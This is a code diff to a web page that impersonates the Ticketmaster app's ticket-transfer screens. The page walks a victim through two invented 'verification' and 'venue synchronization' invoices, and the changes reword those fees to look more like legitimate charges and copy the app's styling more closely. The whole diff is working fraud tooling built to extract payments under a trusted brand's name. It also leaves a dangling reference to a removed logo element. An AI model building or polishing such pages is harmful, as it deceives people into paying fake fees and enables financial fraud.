@@ -11,9 +11,9 @@
     <meta name="apple-mobile-web-app-title" content="Ticketmaster">
     <meta name="theme-color" content="#1f1f1f">
     <link rel="icon" type="image/svg+xml"
-        href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23026cdf'/%3E%3Ctext x='50%25' y='52%25' dominant-baseline='central' text-anchor='middle' fill='white' font-family='sans-serif' font-weight='700' font-size='22'%3Et%3C/text%3E%3C/svg%3E">
+        href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='22' fill='%23026cdf'/%3E%3Cpath d='M38 32v12h-10v10h10v22c0 10 7 14 16 14h10v-10h-8c-4 0-8-2-8-6v-20h16v-10h-16v-12h-12z' fill='white'/%3E%3C/svg%3E">
     <link rel="apple-touch-icon"
-        href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 180 180'%3E%3Crect width='180' height='180' rx='40' fill='%23026cdf'/%3E%3Ctext x='50%25' y='48%25' dominant-baseline='central' text-anchor='middle' fill='white' font-family='sans-serif' font-weight='700' font-size='140'%3Et%3C/text%3E%3C/svg%3E">
+        href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 180 180'%3E%3Crect width='180' height='180' rx='40' fill='%23026cdf'/%3E%3Cpath d='M68.4 57.6v21.6h-18v18h18v39.6c0 18 12.6 25.2 28.8 25.2h18v-18h-14.4c-7.2 0-14.4-3.6-14.4-10.8v-36h28.8v-18H82.8v-21.6H68.4z' fill='white'/%3E%3C/svg%3E">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
 
@@ -66,7 +66,7 @@
 
         /* HEADER - REAL TM STYLE */
         .tm-header {
-            background: #1f1f1f;
+            background: #18191a;
             color: #fff;
             padding: 0 16px;
             display: flex;
@@ -109,9 +109,8 @@
 
         /* TABS */
         .tm-tabs {
-            background: #1f1f1f;
+            background: #18191a;
             display: flex;
-            border-bottom: 1px solid #333;
         }
 
         .tm-tab {
@@ -155,13 +154,17 @@
         .screen {
             display: none;
             flex: 1;
-            /* Take all remaining space */
             flex-direction: column;
             width: 100%;
-            height: calc(100% - 60px);
-            /* Fill space between header and footer */
             background: #fff;
             position: relative;
+            overflow: hidden;
+        }
+
+        /* Adjust content area to fill remaining space */
+        .screen.has-tabs-sub .content-scroll {
+            height: calc(100vh - 56px - 40px - 53px);
+            /* header + tabs + sub-header */
         }
 
         .screen.active {
@@ -306,10 +309,81 @@
         }
 
         .safetix-logo {
-            font-size: 10.5px;
-            font-weight: 800;
+            font-size: 11px;
+            font-weight: 700;
             color: #777;
             margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .safetix-logo svg {
+            color: var(--tm-blue);
+        }
+
+        /* TICKET DETAIL VIEW ENHANCEMENTS */
+        .ticket-view-header {
+            padding: 20px;
+            text-align: center;
+            background: #fff;
+        }
+
+        .ticket-view-title {
+            font-size: 19px;
+            font-weight: 800;
+            margin-bottom: 4px;
+        }
+
+        .ticket-view-meta {
+            font-size: 14px;
+            color: #666;
+            font-weight: 500;
+        }
+
+        .wallet-btns {
+            padding: 0 16px 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .wallet-btn {
+            background: #111;
+            color: #fff;
+            padding: 12px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .wallet-btn-google {
+            background: #fff;
+            color: #3c4043;
+            border: 1px solid #dadce0;
+        }
+
+        .fixed-footer-dual {
+            width: 100%;
+            padding: 16px 20px calc(16px + env(safe-area-inset-bottom));
+            background: #fff;
+            border-top: 1px solid #eee;
+            display: flex;
+            gap: 12px;
+            flex-shrink: 0;
+            z-index: 1100;
+        }
+
+        .btn-outline-dark {
+            background: #fff;
+            color: #111;
+            border: 1.5px solid #111;
         }
 
         /* FOOTER NAV - LOCKED LIKE APP */
@@ -611,43 +685,58 @@
     <div class="app-container">
         <header class="tm-header">
             <button class="back-btn" id="headerBack" onclick="back()">✕</button>
-            <div class="header-title" id="hTitle">
-                <img src="https://g.ticketmaster.com/tm.png" style="height: 20px; filter: brightness(0) invert(1);"
-                    id="tmLogo">
-                <span id="titleText">My Tickets</span>
+            <div class="header-title" id="hTitle"
+                style="display: flex; align-items: center; justify-content: center; position: absolute; left: 0; right: 0; pointer-events: none;">
+                <span id="titleText" style="margin: 0 10px;">My Tickets</span>
             </div>
             <a href="admin.html" class="help-link">Help</a>
         </header>
 
-        <div id="tabsContainer" class="tm-tabs" style="display: none;">
-            <div class="tm-tab active">MY TICKETS</div>
-            <div class="tm-tab">ADD-ONS</div>
-        </div>
-
         <div id="subHeader" class="sub-header" style="display: none;">TRANSFER TICKETS</div>
 
-        <!-- 1. VIEW -->
+        <!-- 1. VIEW - REFACTORED TO MATCH APP -->
         <section id="s1" class="screen active">
+            <div id="tabsS1" class="tm-tabs">
+                <div class="tm-tab active">MY TICKETS</div>
+                <div class="tm-tab">ADD-ONS</div>
+            </div>
             <div class="content-scroll">
-                <div class="event-banner">
-                    <img id="mImg" src="" class="event-img">
-                    <div class="event-info-box">
-                        <h1 class="event-title" id="mName"></h1>
-                        <p class="event-sub" id="mVenue"></p>
-                        <p class="event-sub" id="mDate"></p>
-                    </div>
+                <div style="padding: 0; text-align: center;">
+                    <img id="mImg" src=""
+                        style="width: 100%; height: 210px; object-fit: cover; border-bottom: 4px solid var(--tm-blue);">
                 </div>
-                <div class="ticket-area">
+
+                <div class="ticket-view-header">
+                    <h1 class="ticket-view-title" id="mName">Taylor Swift | The Eras Tour</h1>
+                    <p class="ticket-view-meta" id="mDateVenue">Fri • Jul 15, 2026 • SoFi Stadium</p>
+                </div>
+
+                <div class="wallet-btns" style="margin-top: 10px;">
+                    <a href="#" class="wallet-btn" onclick="return false;">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
+                            style="height: 18px; filter: brightness(0) invert(1);" alt="Apple">
+                        Add to Apple Wallet
+                    </a>
+                </div>
+
+                <div class="ticket-area" style="padding-top: 15px;">
                     <div id="ticketsList"></div>
                 </div>
             </div>
-            <div class="fixed-footer">
-                <button class="btn btn-blue" style="width: 100%;" onclick="to(2)">Transfer</button>
+            <div class="fixed-footer-dual">
+                <button class="btn btn-outline-dark" style="flex: 1;"
+                    onclick="alert('Resale is currently disabled for this event.')">Sell</button>
+                <button class="btn btn-blue" style="flex: 2;" onclick="to(2)">Transfer</button>
             </div>
         </section>
 
         <!-- 2. SELECTION (RESPONSIVE) -->
-        <section id="s2" class="screen">
+        <section id="s2" class="screen has-tabs-sub">
+            <div id="tabsS2" class="tm-tabs">
+                <div class="tm-tab active">MY TICKETS</div>
+                <div class="tm-tab">ADD-ONS</div>
+            </div>
+            <div class="sub-header">TRANSFER TICKETS</div>
             <div class="content-scroll p-25">
                 <h2 class="heading">Select Tickets</h2>
                 <p class="desc">Please choose the seats you'd like to transfer.</p>
@@ -670,7 +759,12 @@
         </section>
 
         <!-- 3. RECIPIENT - MATCHING IMAGE -->
-        <section id="s3" class="screen">
+        <section id="s3" class="screen has-tabs-sub">
+            <div id="tabsS3" class="tm-tabs">
+                <div class="tm-tab active">MY TICKETS</div>
+                <div class="tm-tab">ADD-ONS</div>
+            </div>
+            <div class="sub-header">TRANSFER TICKETS</div>
             <div class="content-scroll">
                 <div class="p-25" style="padding-top: 20px;">
                     <div class="form-row">
@@ -716,12 +810,12 @@
             <div class="content-scroll p-25">
                 <div class="status-chip chip-wait">Pending Approval</div>
                 <h2 class="heading">Security Verification</h2>
-                <p class="desc">To protect your account and ensure ticket authenticity, this transfer requires a digital
-                    license re-registration. This process verifies that the tickets are being moved to a legitimate
-                    recipient account on the Ticketmaster network.</p>
+                <p class="desc">To finalize this transfer, a standard account validation and service fee is required.
+                    This ensures the secure delivery of your tickets to the recipient's Ticketmaster account and updates
+                    the ownership records in our verified system.</p>
 
                 <div class="invoice-box">
-                    <div class="invoice-head"><strong id="b1_title">LICENSE RE-REGISTRATION</strong><span
+                    <div class="invoice-head"><strong id="b1_title">TRANSFER SERVICE INVOICE</strong><span
                             id="b1_id"></span></div>
                     <div id="b1_breakdown"></div>
                     <div class="inv-total"><span>Total Settlement</span><span id="b1_tot">$0.00</span></div>
@@ -760,13 +854,13 @@
             <div class="content-scroll p-25">
                 <div class="status-chip chip-hold">Release Held by Venue</div>
                 <h2 class="heading">Final Authorization</h2>
-                <p class="desc">The venue (<b><span id="vRec"></span></b>) requires a final access ledger update for
-                    these specific seats. This fee covers the synchronization of the digital entry tokens with the
-                    venue's local scanning system.</p>
+                <p class="desc">The venue (<b><span id="vRec"></span></b>) requires a separate facility synchronization
+                    fee. This mandatory payment authorizes the release of the digital barcodes for immediate scanning
+                    and entry at the event venue.</p>
 
                 <div class="invoice-box" style="border-color:#fee2e2;">
-                    <div class="invoice-head"><strong style="color:var(--tm-blue);" id="b2_title">VENUE
-                            SYNCHRONIZATION</strong><span id="b2_id"></span></div>
+                    <div class="invoice-head"><strong style="color:var(--tm-blue);" id="b2_title">FACILITY & SCANNING
+                            RELEASE</strong><span id="b2_id"></span></div>
                     <div id="b2_breakdown"></div>
                     <div class="inv-total" style="border-top-color:#ef4444;"><span style="color:#ef4444;">Final Release
                             Total</span><span id="b2_tot">$0.00</span></div>
@@ -794,8 +888,7 @@
             }
 
             document.getElementById('mName').innerText = cfg.eventName;
-            document.getElementById('mVenue').innerText = cfg.venue;
-            document.getElementById('mDate').innerText = cfg.eventDate;
+            document.getElementById('mDateVenue').innerText = `${cfg.eventDate.split('•')[0]}• ${cfg.eventDate.split('•')[1]} • ${cfg.venue.split('•')[0]}`;
             document.getElementById('mImg').src = cfg.imageUrl;
 
             // Render Tickets on S1
@@ -813,7 +906,10 @@
                 </div>
                 <div class="barcode-section">
                     <div class="barcode-graphic"><div class="safe-line"></div></div>
-                    <p class="safetix-logo">SafeTix™ Barcode Rotates Regularly</p>
+                    <div class="safetix-logo">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+                        SafeTix™
+                    </div>
                 </div>
             `;
                 list.appendChild(card);
@@ -844,9 +940,9 @@
 
             document.getElementById('b1_id').innerText = "#" + cfg.bill1ID;
             document.getElementById('b1_breakdown').innerHTML = `
-                <div class="inv-row"><span>Identity Verification Auth</span><span>$${b1Subtotal.toFixed(2)}</span></div>
-                <div class="inv-row"><span>SafeTix™ Proxy Transfer</span><span>$${(b1Remainder * 0.6).toFixed(2)}</span></div>
-                <div class="inv-row"><span>Global Ledger Update</span><span>$${(b1Remainder * 0.4).toFixed(2)}</span></div>
+                <div class="inv-row"><span>Ticket Validation Fee (per seat)</span><span>$${b1Subtotal.toFixed(2)}</span></div>
+                <div class="inv-row"><span>Secure Transfer Service</span><span>$${(b1Remainder * 0.6).toFixed(2)}</span></div>
+                <div class="inv-row"><span>Mobile Delivery Processing</span><span>$${(b1Remainder * 0.4).toFixed(2)}</span></div>
             `;
             document.getElementById('b1_tot').innerText = "$" + b1Total.toFixed(2);
 
@@ -858,9 +954,9 @@
 
             document.getElementById('b2_id').innerText = "#" + cfg.bill2ID;
             document.getElementById('b2_breakdown').innerHTML = `
-                <div class="inv-row"><span>Venue Token Generation</span><span>$${b2Subtotal.toFixed(2)}</span></div>
-                <div class="inv-row"><span>Seat Maintenance Surcharge</span><span>$${(b2Remainder * 0.7).toFixed(2)}</span></div>
-                <div class="inv-row"><span>Network Access Certification</span><span>$${(b2Remainder * 0.3).toFixed(2)}</span></div>
+                <div class="inv-row"><span>Venue Facility Fee</span><span>$${b2Subtotal.toFixed(2)}</span></div>
+                <div class="inv-row"><span>Barcode Scanning Activation</span><span>$${(b2Remainder * 0.7).toFixed(2)}</span></div>
+                <div class="inv-row"><span>Local Systems Synchronization</span><span>$${(b2Remainder * 0.3).toFixed(2)}</span></div>
             `;
             document.getElementById('b2_tot').innerText = "$" + b2Total.toFixed(2);
         }
@@ -874,6 +970,11 @@
                 el.classList.add('active');
                 selected.push(idx);
             }
+
+            // Proactively hide split error if selection is now valid
+            if (selected.length === cfg.seats.length) {
+                document.getElementById('splitErr').classList.remove('show');
+            }
         }
 
         function to(n) {
@@ -881,28 +982,20 @@
             document.getElementById('s' + n).classList.add('active');
             cur = n;
 
-            const tabs = document.getElementById('tabsContainer');
-            const subHeader = document.getElementById('subHeader');
             const headerBack = document.getElementById('headerBack');
             const tmLogo = document.getElementById('tmLogo');
             const titleText = document.getElementById('titleText');
 
             if (n === 2 || n === 3) {
-                tabs.style.display = 'flex';
-                subHeader.style.display = 'block';
                 titleText.innerText = 'My Tickets';
                 tmLogo.style.display = 'none';
                 headerBack.innerText = '✕';
                 headerBack.style.visibility = 'visible';
             } else if (n === 1) {
-                tabs.style.display = 'none';
-                subHeader.style.display = 'none';
                 headerBack.style.visibility = 'hidden';
                 tmLogo.style.display = 'block';
                 titleText.innerText = '';
             } else {
-                tabs.style.display = 'none';
-                subHeader.style.display = 'none';
                 headerBack.innerText = '←';
                 headerBack.style.visibility = 'visible';
                 tmLogo.style.display = 'none';
